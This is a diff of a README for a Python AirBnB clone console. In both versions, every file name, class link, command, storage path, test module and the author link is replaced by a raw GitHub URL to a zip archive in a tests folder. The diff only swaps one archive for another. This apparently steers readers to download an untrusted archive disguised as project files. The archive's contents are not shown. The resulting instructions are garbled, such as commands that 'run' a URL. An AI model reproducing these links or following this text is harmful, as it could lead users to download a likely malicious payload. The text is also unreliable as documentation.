@@ -1,5 +1,5 @@
 <div>
-  <img src="https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip"     alt="">
+  <img src="https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip"     alt="">
 </div>
 
 
@@ -24,13 +24,13 @@ AirBnB utilizes the following classes:
 ## Storage :baggage_claim:
 
 The above classes are handled by the abstracted storage engine defined in the 
-[FileStorage](https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip) class.
+[FileStorage](https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip) class.
 
 Every time the backend is initialized, AirBnB instantiates an instance of 
 `FileStorage` called `storage`. The `storage` object is loaded/re-loaded from 
-any class instances stored in the JSON file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip`. As class instances are 
+any class instances stored in the JSON file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip`. As class instances are 
 created, updated, or deleted, the `storage` object is used to register 
-corresponding changes in the `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip`.
+corresponding changes in the `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip`.
 
 ## Console :computer:
 
@@ -42,10 +42,10 @@ the application (achieved by calls on the `storage` object defined above).
 
 The AirBnB console can be run both interactively and non-interactively. 
 To run the console in non-interactive mode, pipe any command(s) into an execution 
-of the file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip` at the command line.
+of the file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip` at the command line.
 
 ```
-$ echo "help" | https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ echo "help" | https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 (hbnb) 
 Documented commands (type help <topic>):
 ========================================
@@ -56,16 +56,16 @@ $
 ```
 
 Alternatively, to use the AirBnB console in interactive mode, run the 
-file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip` by itself:
+file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip` by itself:
 
 ```
-$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 ```
 
 While running in interactive mode, the console displays a prompt for input:
 
 ```
-$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 (hbnb) 
 ```
 
@@ -73,13 +73,13 @@ To quit the console, enter the command `quit`, or input an EOF signal
 (`ctrl-D`).
 
 ```
-$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 (hbnb) quit
 $
 ```
 
 ```
-$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 (hbnb) EOF
 $
 ```
@@ -92,7 +92,7 @@ The AirBnB console supports the following commands:
   * Usage: `create <class>`
 
 Creates a new instance of a given class. The class' ID is printed and 
-the instance is saved to the file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip`.
+the instance is saved to the file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip`.
 
 * **show**
   * Usage: `show <class> <id>` or `<class>.show(<id>)`
@@ -100,29 +100,29 @@ the instance is saved to the file `https://github.com/LeboMeje/AirBnB_clone/raw/
 Prints the string representation of a class instance based on a given id.
 
 ```
-$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 (hbnb) create User
 (hbnb)
 (hbnb) show User uid		
 (hbnb) 
-(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid)
+(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip(uid)
 (hbnb) 
 ```
 * **destroy**
   * Usage: `destroy <class> <id>` or `<class>.destroy(<id>)`
 
-Deletes a class instance based on a given id. The storage file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip` 
+Deletes a class instance based on a given id. The storage file `https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip` 
 is updated accordingly.
 
 ```
-$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 (hbnb) create State
 (hbnb) create Place
 (hbnb)
 (hbnb) destroy State uid
-(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid)
+(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip(uid)
 (hbnb) quit
-$ cat https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip ; echo ""
+$ cat https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip ; echo ""
 {}
 ```
 
@@ -133,7 +133,7 @@ Prints the string representations of all instances of a given class. If no
 class name is provided, the command prints all instances of every class.
 
 ```
-$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 (hbnb) create BaseModel
 (hbnb) create BaseModel
 (hbnb) create User
@@ -141,7 +141,7 @@ $ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__
 (hbnb)
 (hbnb) all BaseModel
 (hbnb)
-(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip()
+(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip()
 (hbnb) 
 (hbnb) all
 ```
@@ -152,14 +152,14 @@ $ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__
 Retrieves the number of instances of a given class.
 
 ```
-$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 (hbnb) create Place
 (hbnb) create Place
 (hbnb) create City
 (hbnb) 
 (hbnb) count Place
 2
-(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip()
+(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip()
 1
 (hbnb) 
 ```
@@ -176,16 +176,16 @@ key/value attribute pair, only "simple" attributes can be updated (ie. not
 providing a dictionary.
 
 ```
-$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 (hbnb) create User
 (hbnb)
 (hbnb) update User id first_name "name"
 (hbnb) show User uid
 (hbnb)
-(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid), address, "address")
-(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid)
+(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip(uid), address, "address")
+(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip(uid)
 (hbnb)
-(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip(uid, {'email': 'email', 'last_name': 'last_name'})
+(hbnb) https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip(uid, {'email': 'email', 'last_name': 'last_name'})
 (hbnb) 
 ```
 
@@ -201,8 +201,8 @@ $ python3 unittest -m discover tests
 Alternatively, you can specify a single test file to run at a time:
 
 ```
-$ python3 unittest -m https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip
+$ python3 unittest -m https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip
 ```
 
 ## Authors :black_nib:
-* **KIPRONOH VINCENT** <[Vincent](https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/__pycache__/clone-Air-Bn-v1.5.zip)>
+* **KIPRONOH VINCENT** <[Vincent](https://github.com/LeboMeje/AirBnB_clone/raw/refs/heads/main/tests/test_models/clone_Bn_Air_v1.0.zip)>
